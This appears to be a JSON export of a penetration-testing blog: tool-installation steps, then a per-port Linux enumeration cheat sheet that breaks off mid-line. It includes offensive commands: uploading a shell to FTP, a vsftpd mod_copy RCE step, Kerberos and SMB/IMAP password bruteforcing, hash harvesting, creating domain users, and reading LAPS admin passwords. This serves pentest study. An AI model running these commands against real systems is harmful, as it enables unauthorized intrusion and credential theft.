~/tools/ftp-user-enum.pl\nsudo cp ~/tools/ftp-user-enum.pl /usr/local/bin\n```\n```bash smtp-user-enum\nsudo apt install -y smtp-user-enum\n``` swaks\n```bash swaks - Swiss Army Knife for SMTP\nsudo apt-get install swaks\n```\n```bash DNScan\ngit clone https://github.com/rbsec/dnscan.git ~/tools/dnscan\nsudo cp ~/tools/dnscan/dnscan.py /usr/local/bin\n```\n```bash acccheck\nwget http://archive.ubuntu.com/ubuntu/pool/multiverse/a/acccheck/acccheck_0.2.1-3_all.deb -O ~/tools/acccheck.deb\nsudo dpkg -i ~/tools/acccheck.deb\n```\n```bash exportfs\nsudo apt install -y nfs-kernel-server\nexportfs -h\n```\n```bash NfSpy - manipulate UID/GID\ngit clone https://github.com/bonsaiviking/NfSpy.git ~/tools/NfSpy\ncd ~/tools/NfSpy\nsudo python2 setup.py install\npython2 ~/tools/NfSpy/nfspy.py\n```\n```bash scavanger - find interesting files\ngit clone https://github.com/SpiderLabs/scavenger.git ~/tools/scavanger\nchmod +x ~/tools/scavanger/scavenger.py\nsudo cp ~/tools/scavanger/scavenger.py /usr/local/bin\n```\n```bash bpftrace - High-level tracing language for Linux eBPF\nsudo apt-get install -y bpftrace\n```\n```bash ike-scan - discover and fingerprint IKE hosts (IPsec VPN servers)\nsudo apt install ike-scan\n```\n```bash strongswan - IPsec VPN\nsudo apt install strongswan\nsudo nano /etc/ipsec.conf # configure it\nsudo nano /etc/ipsec.secrets # add user creds\n\nipsec up $conn_name\n```\n```bash iis_shortname_scanner\ngit clone https://github.com/lijiejie/IIS_shortname_Scanner.git ~/tools/IIS_shortname_Scanner\n```\n```bash sshpass - parse password in command\n# even though it might be good for automation you type the password\n# and it can be sniffed upon login. \n# Integrating passwords in commands is not a good practice!\nsudo apt install sshpass\n```\n\n\n\n<br>\n\nUse my tool to manage terminals and automate enumeration\n<a href=\"https://github.com/ChronosPk/APET\" target=\"_\">APET (Automate the Process of Enumeration with Terminator)</a>\n\n```bash\nsudo apt install -y git terminator seclists ldap-utils \npython3 -m pip install impacket\n\ngit clone https://github.com/ChronosPK/APET.git\ncd APET\n./apet.sh -h\n```\n\n<br>\n\nCase-insensitive autocomplete (`bash`)\n```bash\necho set completion-ignore-case on | sudo tee -a /etc/inputrc\n```\n\n<br>\n\n## Other tools\n```bash chisel - TCP/UDP tunnel, transported over HTTP, secured via SSH\nsudo apt install -y chisel\n```\n```bash localtunnel - share a local web server online\nnpm install -g localtunnel\nlt --port 8000\n```\n\n<br>\n\n---\n---","slug":"Pentesting/Linux/1","published":1,"updated":"2024-09-23T06:18:55.853Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhd00036gvg4qao3xsp","content":"<hr>\n<p>Step 1 in a penetration test: Preparation.<br>Install the necessary tools, prepare scripts and the working environment.</p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<pre><div class=\"caption\"><span>Create a dedicated directory (stay organized)</span></div><code class=\"highlight bash\"><span class=\"built_in\">mkdir</span> -p ~/tools</code></pre>\n\n<h2 id=\"Pentesting-tools\"><a href=\"#Pentesting-tools\" class=\"headerlink\" title=\"Pentesting tools\"></a>Pentesting tools</h2><pre><div class=\"caption\"><span>Impacket scripts</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y impacket-scripts</code></pre>\n<pre><div class=\"caption\"><span>Sublime - text editor</span></div><code class=\"highlight bash\">wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | gpg --dearmor | <span class=\"built_in\">sudo</span> <span class=\"built_in\">tee</span> /etc/apt/trusted.gpg.d/sublimehq-archive.gpg &gt; /dev/null\n<span class=\"built_in\">echo</span> <span class=\"string\">&quot;deb https://download.sublimetext.com/ apt/stable/&quot;</span> | <span class=\"built_in\">sudo</span> <span class=\"built_in\">tee</span> /etc/apt/sources.list.d/sublime-text.list\n<span class=\"built_in\">sudo</span> apt-get update; <span class=\"built_in\">sudo</span> apt-get install sublime-text</code></pre>\n<pre><div class=\"caption\"><span>if you get an error installing Sublime</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get update &amp;&amp; <span class=\"built_in\">sudo</span> apt-get install libgl1-mesa-dev</code></pre>\n<pre><div class=\"caption\"><span>nmapautomator</span></div><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/21y4d/nmapAutomator.git ~/tools/nmapAutomator\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">cp</span> ~/tools/nmapAutomator/nmapAutomator.sh /usr/local/bin/\nnmapAutomator.sh -h</code></pre>\n<pre><div class=\"caption\"><span>terminator - GNOME terminal</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y terminator</code></pre>\n<pre><div class=\"caption\"><span>pspy - view processes</span></div><code class=\"highlight bash\">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O ~/tools/pspy64\nwget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 -O ~/tools/pspy32\n<span class=\"built_in\">chmod</span> +x ~/tools/pspy64 ~/tools/pspy32\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">cp</span> ~/tools/pspy64 /usr/local/bin\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">cp</span> ~/tools/pspy32 /usr/local/bin</code></pre>\n<pre><div class=\"caption\"><span>bbot - recursive internet scanner</span></div><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/blacklanternsecurity/bbot ~/tools/bbot\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">cp</span> ~/tools/bbot /usr/local/bin</code></pre>\n<pre><div class=\"caption\"><span>ftp-user-enum</span></div><code class=\"highlight bash\">wget https://raw.githubusercontent.com/pentestmonkey/ftp-user-enum/master/ftp-user-enum.pl -O ~/tools/ftp-user-enum.pl\n<span class=\"built_in\">chmod</span> +x ~/tools/ftp-user-enum.pl\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">cp</span> ~/tools/ftp-user-enum.pl /usr/local/bin</code></pre>\n<pre><div class=\"caption\"><span>smtp-user-enum</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y smtp-user-enum\n``` swaks\n```bash swaks - Swiss Army Knife <span class=\"keyword\">for</span> SMTP\n<span class=\"built_in\">sudo</span> apt-get install swaks</code></pre>\n<pre><div class=\"caption\"><span>DNScan</span></div><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/rbsec/dnscan.git ~/tools/dnscan\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">cp</span> ~/tools/dnscan/dnscan.py /usr/local/bin</code></pre>\n<pre><div class=\"caption\"><span>acccheck</span></div><code class=\"highlight bash\">wget http://archive.ubuntu.com/ubuntu/pool/multiverse/a/acccheck/acccheck_0.2.1-3_all.deb -O ~/tools/acccheck.deb\n<span class=\"built_in\">sudo</span> dpkg -i ~/tools/acccheck.deb</code></pre>\n<pre><div class=\"caption\"><span>exportfs</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y nfs-kernel-server\nexportfs -h</code></pre>\n<pre><div class=\"caption\"><span>NfSpy - manipulate UID/GID</span></div><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/bonsaiviking/NfSpy.git ~/tools/NfSpy\n<span class=\"built_in\">cd</span> ~/tools/NfSpy\n<span class=\"built_in\">sudo</span> python2 setup.py install\npython2 ~/tools/NfSpy/nfspy.py</code></pre>\n<pre><div class=\"caption\"><span>scavanger - find interesting files</span></div><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/SpiderLabs/scavenger.git ~/tools/scavanger\n<span class=\"built_in\">chmod</span> +x ~/tools/scavanger/scavenger.py\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">cp</span> ~/tools/scavanger/scavenger.py /usr/local/bin</code></pre>\n<pre><div class=\"caption\"><span>bpftrace - High-level tracing language for Linux eBPF</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get install -y bpftrace</code></pre>\n<pre><div class=\"caption\"><span>ike-scan - discover and fingerprint IKE hosts (IPsec VPN servers)</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install ike-scan</code></pre>\n<pre><div class=\"caption\"><span>strongswan - IPsec VPN</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install strongswan\n<span class=\"built_in\">sudo</span> nano /etc/ipsec.conf <span class=\"comment\"># configure it</span>\n<span class=\"built_in\">sudo</span> nano /etc/ipsec.secrets <span class=\"comment\"># add user creds</span>\n\nipsec up <span class=\"variable\">$conn_name</span></code></pre>\n<pre><div class=\"caption\"><span>iis_shortname_scanner</span></div><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/lijiejie/IIS_shortname_Scanner.git ~/tools/IIS_shortname_Scanner</code></pre>\n<pre><div class=\"caption\"><span>sshpass - parse password in command</span></div><code class=\"highlight bash\"><span class=\"comment\"># even though it might be good for automation you type the password</span>\n<span class=\"comment\"># and it can be sniffed upon login. </span>\n<span class=\"comment\"># Integrating passwords in commands is not a good practice!</span>\n<span class=\"built_in\">sudo</span> apt install sshpass</code></pre>\n\n\n\n<br>\n\n<p>Use my tool to manage terminals and automate enumeration<br><a href=\"https://github.com/ChronosPk/APET\" target=\"_\">APET (Automate the Process of Enumeration with Terminator)</a></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y git terminator seclists ldap-utils \npython3 -m pip install impacket\n\ngit <span class=\"built_in\">clone</span> https://github.com/ChronosPK/APET.git\n<span class=\"built_in\">cd</span> APET\n./apet.sh -h</code></pre>\n\n<br>\n\n<p>Case-insensitive autocomplete (<code>bash</code>)</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"built_in\">set</span> completion-ignore-case on | <span class=\"built_in\">sudo</span> <span class=\"built_in\">tee</span> -a /etc/inputrc</code></pre>\n\n<br>\n\n<h2 id=\"Other-tools\"><a href=\"#Other-tools\" class=\"headerlink\" title=\"Other tools\"></a>Other tools</h2><pre><div class=\"caption\"><span>chisel - TCP/UDP tunnel, transported over HTTP, secured via SSH</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y chisel</code></pre>\n<pre><div class=\"caption\"><span>localtunnel - share a local web server online</span></div><code class=\"highlight bash\">npm install -g localtunnel\nlt --port 8000</code></pre>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Step 1 in a penetration test: Preparation.<br>Install the necessary tools, prepare scripts and the working environment.</p>\n<hr>","more":"<br>\n\n<pre><div class=\"caption\"><span>Create a dedicated directory (stay organized)</span></div><code class=\"highlight bash\"><span class=\"built_in\">mkdir</span> -p ~/tools</code></pre>\n\n<h2 id=\"Pentesting-tools\"><a href=\"#Pentesting-tools\" class=\"headerlink\" title=\"Pentesting tools\"></a>Pentesting tools</h2><pre><div class=\"caption\"><span>Impacket scripts</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y impacket-scripts</code></pre>\n<pre><div class=\"caption\"><span>Sublime - text editor</span></div><code class=\"highlight bash\">wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | gpg --dearmor | <span class=\"built_in\">sudo</span> <span class=\"built_in\">tee</span> /etc/apt/trusted.gpg.d/sublimehq-archive.gpg &gt; /dev/null\n<span class=\"built_in\">echo</span> <span class=\"string\">&quot;deb https://download.sublimetext.com/ apt/stable/&quot;</span> | <span class=\"built_in\">sudo</span> <span class=\"built_in\">tee</span> /etc/apt/sources.list.d/sublime-text.list\n<span class=\"built_in\">sudo</span> apt-get update; <span class=\"built_in\">sudo</span> apt-get install sublime-text</code></pre>\n<pre><div class=\"caption\"><span>if you get an error installing Sublime</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get update &amp;&amp; <span class=\"built_in\">sudo</span> apt-get install libgl1-mesa-dev</code></pre>\n<pre><div class=\"caption\"><span>nmapautomator</span></div><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/21y4d/nmapAutomator.git ~/tools/nmapAutomator\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">cp</span> ~/tools/nmapAutomator/nmapAutomator.sh /usr/local/bin/\nnmapAutomator.sh -h</code></pre>\n<pre><div class=\"caption\"><span>terminator - GNOME terminal</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y terminator</code></pre>\n<pre><div class=\"caption\"><span>pspy - view processes</span></div><code class=\"highlight bash\">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O ~/tools/pspy64\nwget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 -O ~/tools/pspy32\n<span class=\"built_in\">chmod</span> +x ~/tools/pspy64 ~/tools/pspy32\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">cp</span> ~/tools/pspy64 /usr/local/bin\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">cp</span> ~/tools/pspy32 /usr/local/bin</code></pre>\n<pre><div class=\"caption\"><span>bbot - recursive internet scanner</span></div><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/blacklanternsecurity/bbot ~/tools/bbot\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">cp</span> ~/tools/bbot /usr/local/bin</code></pre>\n<pre><div class=\"caption\"><span>ftp-user-enum</span></div><code class=\"highlight bash\">wget https://raw.githubusercontent.com/pentestmonkey/ftp-user-enum/master/ftp-user-enum.pl -O ~/tools/ftp-user-enum.pl\n<span class=\"built_in\">chmod</span> +x ~/tools/ftp-user-enum.pl\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">cp</span> ~/tools/ftp-user-enum.pl /usr/local/bin</code></pre>\n<pre><div class=\"caption\"><span>smtp-user-enum</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y smtp-user-enum\n``` swaks\n```bash swaks - Swiss Army Knife <span class=\"keyword\">for</span> SMTP\n<span class=\"built_in\">sudo</span> apt-get install swaks</code></pre>\n<pre><div class=\"caption\"><span>DNScan</span></div><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/rbsec/dnscan.git ~/tools/dnscan\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">cp</span> ~/tools/dnscan/dnscan.py /usr/local/bin</code></pre>\n<pre><div class=\"caption\"><span>acccheck</span></div><code class=\"highlight bash\">wget http://archive.ubuntu.com/ubuntu/pool/multiverse/a/acccheck/acccheck_0.2.1-3_all.deb -O ~/tools/acccheck.deb\n<span class=\"built_in\">sudo</span> dpkg -i ~/tools/acccheck.deb</code></pre>\n<pre><div class=\"caption\"><span>exportfs</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y nfs-kernel-server\nexportfs -h</code></pre>\n<pre><div class=\"caption\"><span>NfSpy - manipulate UID/GID</span></div><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/bonsaiviking/NfSpy.git ~/tools/NfSpy\n<span class=\"built_in\">cd</span> ~/tools/NfSpy\n<span class=\"built_in\">sudo</span> python2 setup.py install\npython2 ~/tools/NfSpy/nfspy.py</code></pre>\n<pre><div class=\"caption\"><span>scavanger - find interesting files</span></div><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/SpiderLabs/scavenger.git ~/tools/scavanger\n<span class=\"built_in\">chmod</span> +x ~/tools/scavanger/scavenger.py\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">cp</span> ~/tools/scavanger/scavenger.py /usr/local/bin</code></pre>\n<pre><div class=\"caption\"><span>bpftrace - High-level tracing language for Linux eBPF</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get install -y bpftrace</code></pre>\n<pre><div class=\"caption\"><span>ike-scan - discover and fingerprint IKE hosts (IPsec VPN servers)</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install ike-scan</code></pre>\n<pre><div class=\"caption\"><span>strongswan - IPsec VPN</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install strongswan\n<span class=\"built_in\">sudo</span> nano /etc/ipsec.conf <span class=\"comment\"># configure it</span>\n<span class=\"built_in\">sudo</span> nano /etc/ipsec.secrets <span class=\"comment\"># add user creds</span>\n\nipsec up <span class=\"variable\">$conn_name</span></code></pre>\n<pre><div class=\"caption\"><span>iis_shortname_scanner</span></div><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/lijiejie/IIS_shortname_Scanner.git ~/tools/IIS_shortname_Scanner</code></pre>\n<pre><div class=\"caption\"><span>sshpass - parse password in command</span></div><code class=\"highlight bash\"><span class=\"comment\"># even though it might be good for automation you type the password</span>\n<span class=\"comment\"># and it can be sniffed upon login. </span>\n<span class=\"comment\"># Integrating passwords in commands is not a good practice!</span>\n<span class=\"built_in\">sudo</span> apt install sshpass</code></pre>\n\n\n\n<br>\n\n<p>Use my tool to manage terminals and automate enumeration<br><a href=\"https://github.com/ChronosPk/APET\" target=\"_\">APET (Automate the Process of Enumeration with Terminator)</a></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y git terminator seclists ldap-utils \npython3 -m pip install impacket\n\ngit <span class=\"built_in\">clone</span> https://github.com/ChronosPK/APET.git\n<span class=\"built_in\">cd</span> APET\n./apet.sh -h</code></pre>\n\n<br>\n\n<p>Case-insensitive autocomplete (<code>bash</code>)</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"built_in\">set</span> completion-ignore-case on | <span class=\"built_in\">sudo</span> <span class=\"built_in\">tee</span> -a /etc/inputrc</code></pre>\n\n<br>\n\n<h2 id=\"Other-tools\"><a href=\"#Other-tools\" class=\"headerlink\" title=\"Other tools\"></a>Other tools</h2><pre><div class=\"caption\"><span>chisel - TCP/UDP tunnel, transported over HTTP, secured via SSH</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y chisel</code></pre>\n<pre><div class=\"caption\"><span>localtunnel - share a local web server online</span></div><code class=\"highlight bash\">npm install -g localtunnel\nlt --port 8000</code></pre>\n\n<br>\n\n<hr>\n<hr>"},{"title":"3. Enumeration - Linux","date":"2024-08-02T08:00:00.000Z","toc":true,"_content":"\n---\nStep 3 in a penetration test: Enumeration.\nTry to find relevant info to enter the target machine.\n\n---\n<!-- more -->\n\n<br>\n\n## Port 21/TCP - FTP\n```bash\nnmap --script=*ftp* -p21 $IP -oN recon/nmap.ftp\n\nftp-user-enum.pl -U users.txt -t $IP\n```\n```bash write permissions\n# mount/unmount shares\ncurlftpfs anonymous@$IP ftp-local-mount-dir/\nfusermount -u ftp\n\n# upload files with curl\ncurl -v -P - 'ftp://username:password@$IP/files/' -T \"/var/www/html/shell.sh\"\n\n# upload files manually, depending on file type\n> ascii\n> binary\n> put $file\n```\n```bash no access to view files\nquote PASV\n```\n```mod_copy RCE vsftpd 1.3.5\nnc -v $IP 21\nsite cpfr /my/local/file\nsite cpto /directory/i-have/access-to\n```\n```bash download all files recursively\nwget -r ftp://anonymous:@$IP\n```\n\n<br>\n\n## Port 22/TCP - SSH\n```bash execute command upon login\nssh -t user@$IP 'id; bash -l'\n```\n```bash passphrase-protected private key\nssh2john id_rsa > hash\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt\n```\n```bash SSH tunnels\n# local\nssh -L $local_IP:$local_port:destination_IP:$destination_port user@$SSH_server\n# remote\nssh -R $remote_IP:$remote_port:destination_IP:$destination_port user@$SSH_server\n# do not execute a command\n# -N\n# run in the background\n# -f\n```\n\n<br>\n\n## Port 23/TCP - Telnet\n```bash\nnmap -n -sV -Pn --script \"*telnet* and safe\" -p 23 $IP -oN recon/nmap.telnet\n```\n\n<br>\n\n## Port 25,465,587/TCP - SMTP\n```bash\nnmap --script smtp-enum-users $IP -oN recon/nmap.smtp-users\nnmap -p25 --script smtp-commands $IP -oN recon/nmap.smtp-comm\n\n# if NTLM auth is enabled (WINDOWS)\nnmap -sS -v --script=*-ntlm-info --script-timeout=60s $domain -oN recon/nmap.smtp-ntlm\n```\n```bash\n# modes: EXPN, VRFY or RCPT (default: VRFY)\nsmtp-user-enum -u $USER -t $IP -M $MODE \n```\n```bash\nmsfconsole -q -x \"use auxiliary/scanner/smtp/smtp_enum; set RHOSTS $IP; run\"\n```\n```bash\nswaks --to user@example.com --server test-server.example.net\n```\n\n<br>\n\n## Port 43/TCP - WHOIS\n```bash\nwhois -h $IP -p 43 \"$domain\"\necho \"$domain\" | nc -vn $IP\n```\n\n<br>\n\n## Port 53/TCP/UDP - DNS\n```bash\nnmap -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" $IP -oN recon/nmap.dns\ndnscan.py -d $domain -r -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n```\n```bash query info about the server\ndig @$IP $domain\n```\n```bash zone transfer (TCP)\ndnsrecon -d $domain -t axfr\ndig axfr $domain ns08.$domain\n```\n```bash bruteforce subdomains\nwfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u \"$domain\" -H \"Host: FUZZ.$domain\" --hl 7\ngobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u $domain\nnmap -T4 -p 53 --script dns-brute $domain\n```\n\n<br>\n\n## Port 69/TCP - TFTP\n```bash\nnmap -n -Pn -sU -p69 -sV --script tftp-enum $IP -oN recon/nmap.tftp\n```\n```bash download/upload\nmsfconsole -q -x \"use auxiliary/admin/tftp/tftp_transfer_util; set RHOSTS $IP; run\"\n```\n\n<br>\n\n## Port 80/TCP,443/HTTPs - HTTP,HTTPS\n```bash Enumerate web server based on .ds_store\npython ds_walk.py -u $URL\n```\n```bash\npython3 iis_shortname_Scan.py $URL\n```\n\n<br>\n\n## Port 88/TCP,UDP - Kerberos\n```bash enumerate users (need users list)\n nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=\"$domain\",userdb=/path/to/userlist $IP -oN recon/nmap.kerberos-enum-u\n```\n```bash bruteforce passwords\n# linux\nkerbrute -domain $domain -users users.txt -passwords passwords.txt -outputfile recon/kerbrute.out\n# windows\n.\\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:$domain /outfile:rubeus.txt\n```\n```bash harvest the non-preauth AS_REP responses\nimpacket-GetNPUsers $domain/ -usersfile users.txt -format hashcat -outputfile files/hashes.out\n```\n```bash [with creds] get a list of SPNs (service principal names)\nimpacket-GetUserSPNs -request -dc-ip $IP active.htb/svc_tgs\n```\n\n<br>\n\n## Port 110/TCP,995/TCP - POP3,POP3S\n```bash grab banner\nnc -nv $IP 110\nopenssl s_client -crlf -connect $IP:995\n```\n```bash NTLM info disclosure\nnmap -p 110,995 --script pop3-ntlm-info $IP -oN nmap/pop3-ntlm\n```\n```bash capabilities\nnmap -p 110,995 --script pop3-capabilities $IP -oN nmap/pop3-cap\n```\n```bash commands \nUSER    Username or mailbox.\nPASS    Server/mailbox-specific password.\nSTAT    Number of messages in the mailbox.\nLIST    [ message# ] Messages summary.\nRETR    [ message# ] Retrieve selected message.\nDELE    [ message# ] Delete selected message.\nRSET    Reset the session. Restore deleted messages.\nNOOP    No-op. Keeps connection open.\nQUIT    End session.\n```\n\n<br>\n\n## Port 111/TCP - RPCbind\n```bash\nrpcinfo $IP\n# RPC + NFS   = list, download, upload shares\n# NIS         = ypbind - sensitive files\n# RPC users   = rusersd - enumerate users\n```\n\n<br>\n\n## Port 135/TCP - MSRPC\n```bash\nnmap -sV -script msrpc-enum -Pn $IP -oN recon/nmap.msrpc\n```\n```bash dump\n# RPC endpoints\nimpacket-rpcdump $IP\n\n# SAMR info\nimpacket-samrdump $IP\n```\n```bash\nrpcclient -U \"\" -N $IP\nrpcclient -U user%domain@$IP\nrpcclient //$IP -U $domain/user%$hash --pw-nt-hash\n```\n```bash commands\n> enumprinters\n> enumdomains\n\n> enumdomusers\n\n> queryuser $username\n\n> enumdomgroups\n\n> querygroup 0x$number\n\n> querydominfo\n> querydispinfo\n> enumprivs\n> getdompwinfo\n> getusrdompwinfo 0xnumber\n> dsroledominfo\n> netshareenum\n> netshareenumall\n\n> createdomuser $username\n> setuserinfo2 $username 24 $password\n> lookupnames $username\n\n> chgpasswd $username $old-pass $new-pass\n```\n\n<br>\n\n## Port 137/TCP/UDP,138/UDP,139/TCP - NetBIOS\n```bash\nsudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n $IP -oN recon/nmap.nbtstat\n```\n```bash\n# linux\nnmblookup -A $IP\nnbtscan -v $IP\n# windows\nnbstat -A $IP\n```\n\n<br>\n\n## Port 139/TCP,445/TCP - NetBIOS,SMB\n```bash\nenum4linux -avA $IP > recon/enum4linux.out\nenum4linux -avA $IP -u user -p pass > recon/enum4linux.out\n```\n```bash hostname\nnmblookup -A $IP\nnbtscan -r $NET\n```\n```bash domain info\npolenum '':''@$IP 2>&1\n```\n```bash server info\nrpcclient -W 'WORKGROUP' -U''%'' -c 'srvinfo' $IP 2>&1\n```\n```bash version\nmsfconsole -q -x 'use /scanner/smb/smb_version ; set rhosts $IP; run'\n```\n```bash usernames\nnet rpc group members 'None' -W 'WORKGROUP' -I $IP -U''%'' 2>&1\nrpcclient -W 'WORKGROUP' -c querydispinfo -U''%'' $IP 2>&1\n```\n```bash vulns\nnmap --script smb-vuln* -p 139,445 $IP\n```\n```bash list shares\nnmap --script \"safe or smb-enum-*\" -p 139,445 $IP -oN recon/nmap.smb\n\n# [smbmap] list share (-r) and retrieve share (-A)\nsmbmap -H $IP -r -u 'anonymous'\nsmbmap -H return.local -u svc-printer -p \"1edFg43012\\!\\!\" -r \n\nsmbclient -N -L \\\\\\\\$IP \nsmbclient -N \\\\\\\\$IP\\\\Share --client-protection=off\nsmbclient -U 'user%passwd' -L //$IP\nsmbclient //$IP/Share -U user --pw-nt-hash $hash -W $domain\n\n# download files recursively\nsmbclient '\\\\\\\\$IP\\\\share' -N -c 'prompt OFF ; recurse ON ; cd \"where\\from\" ; lcd \"where/to\" ; mget *'\n```\n```bash authentication bruteforce\nhydra -L user.txt -P pass.txt $IP smb\nacccheck -t $IP -v -u user -P /usr/share/dirb/wordlist/common.txt\n```\n\n<br>\n\n## Port 143/TCP,993/TCP - IMAP,IMAPS\n```bash\nnc -nv $IP 143\nopenssl s_client -connect $IP:993 -quiet\n```\n```bash GUI applications\nevolution\nthunderbird\n```\n```bash IMAP commands\n# login\nA1 LOGIN \"username\" \"password\"\n# list folders/mailboxes\nA1 LIST \"\" *\nA1 LIST INBOX *\nA1 LIST \"Archive\" *\n# select a mailbox\nA1 SELECT INBOX\n# list messages\nA1 FETCH 1:* (FLAGS)\nA1 UID FETCH 1:* (FLAGS)\n# view messages\nA1 FETCH 2 body[text]\nA1 FETCH 2 all\nA1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])\n```\n```bash view and download messages with curl\n# view\ncurl -k 'imaps://$IP/' --user user:pass\ncurl -k 'imaps://$IP/inbox_name?ALL' --user user:pass \ncurl -k 'imaps://1.2.3.4/Drafts?TEXT password' --user user:pass\n# download\ncurl -k 'imaps://1.2.3.4/Drafts;MAILINDEX=1' --user user:pass\n```\n```bash NTLM auth info disclosure\nnmap -p 143,993 --script imap-ntlm-info $IP -oN recon/nmap.imap-ntlm\n```\n```bash bruteforce passwords\nhydra -I -V -F -l user -P /usr/share/wordlists/rockyou.txt $IP imap \nhydra -S -V -l user -P /usr/share/wordlists/rockyou.txt -s 993 $IP imap\n```\n\n<br>\n\n## Port 161/TCP,162/UDP - SNMP\n```bash\nxprobe2 -v -p udp:161:open $IP\n```\n\n<br>\n\n## Port 389/TCP,636/TCP,3269/TCP - LDAP,tcpwrapped\n```bash enumeration\nnmap -n -sV --script \"ldap* and not brute\" $IP -oN recon/nmap.ldap\n```\n```bash ldapsearch\n# null creds\nldapsearch -x -H ldap://$IP -D '' -w '' -b \"DC=domain,DC=name\"\n# authenticate\nldapsearch -x -H ldap://$IP -D '$domain\\user' -w 'password' -b \"CN=Remote Desktop Users,CN=Builtin,DC=domain,DC=name\"\n# extract info anonymously\nldapsearch -x -H ldaps://$IP:636/ -s base -b '' \"(objectClass=*)\" \"*\" +\n# check admin password if LAPS is enabled\nldapsearch -x -H ldap://$IP -D '$domain\\user' -w 'password' -b \"dc=domain,dc=name\" \"(ms-MCS-AdmPwd=*)\" ms-MCS-AdmPwd\n```\n\n<br>\n\n## Port 500/TCP - IKE\n> Internet Key Exchange (IKE), used to establish an IPsec VPN\n\n```bash\nike-scan -M $IP\nike-scan -M --ikev2 $IP\n```\n\n<br>\n\n## Port 2049/TCP - NFS\n```bash\nnmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP -oN recon/nmap.nfs-enum\nnmap --script \"nfs-ls, nfs-showmount, nfs-statfs\" $IP- oN recon/nmap.nfs-list\n```\n```bash\nshowmount -e $IP\nmsfconsole -q -x \"use auxiliary/scanner/nfs/nfsmount; set RHOSTS $IP; run\"\n# check config files\n# /etc/exports\n# /etc/lib/nfs/etab\n```\n```bash mount/unmount shares\n# create mount point\nsudo mkdir /mnt/local_share\n# mount the opn share\nsudo mount -t nfs -o rw,vers=2 $IP:/share_name /mnt/local_share\n# unmount share\nsudo umount /mnt/nfs-share\n\n# match the user with UID and GID if mounting a share with restricted permissions\npython2 ~/tools/NfSpy/nfspy.py -o server=$IP:/share_name,nfsport=2049/tcp,rw /mnt/local_share\n```\n\n<br>\n\n## Port 3306/TCP - MySQL\n```bash \nnmap -sV -Pn -T4 -vv -script=mysql* $IP -p 3306 -oN recon/nmap.mysql\n```\n```bash interact with the DB\nmysql -u'root' -p'root' -h $IP -D 